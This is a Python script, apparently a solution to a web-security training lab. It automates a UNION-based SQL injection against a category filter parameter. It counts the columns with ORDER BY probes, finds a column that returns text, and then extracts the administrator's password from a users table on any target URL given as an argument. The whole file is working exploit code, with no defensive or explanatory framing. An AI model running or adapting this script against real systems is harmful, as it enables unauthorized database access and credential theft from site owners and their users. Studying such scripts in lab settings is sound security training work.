import requests
import urllib3
import sys
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = { 'http':'127.0.0.1:8080', 'https':'127.0.0.1:8080' }

def get_password(s,url,num):
    uri = "/filter?category=users'union+select+"
    null_list = ["NULL"]*num
    null_list[num-1] = "password"
    query = ",".join(null_list)+"+from+users+where+username='administrator'--"
    r = s.get(url+uri+query,verify=False,proxies=proxies)
    soup = BeautifulSoup(r.text,"html.parser")
    password = soup.find("th")
    print("[+] SQL Injection successfull, admin password: "+str(password))


def get_col_data(s,url,num):
    uri = "/filter?category=users'union+select+"
    for i in range(1,num+1):
        null_list = ["NULL"]*num
        null_list[i-1]="'fgfgf'"
        query = ",".join(null_list)+"+from+users+where+username='administrator'--"
        r = s.get(url+uri+query,verify=False,proxies=proxies)
        if "Internal Server Error" not in r.text:
            return i
    return False
    

def get_col_num(s,url):
    uri = "/filter?category=users"
    for i in range(1,50):
        col_num = "'order+by+%s--" %i
        r = s.get(url+uri+col_num,verify=False,proxies=proxies)
        if "Internal Server Error" in r.text:
            return i-1
    return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url> " % sys.argv[0])
        print('[-] Example: %s www.example.com ' % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    col_num = get_col_num(s,url)
    if col_num:
        print("[+] SQL Injection successfull, number of column: "+str(col_num))
    else:
        print("[-] SQL Injection unsuccessfull")
        sys.exit(-1)
    
    col_data = get_col_data(s,url,col_num)
    if col_data:
        print("[+] SQL Injection successfull, column with data type string: "+str(col_data))
    else:
        print("[-] SQL Injection unsuccessfull")

    get_password(s,url,col_data)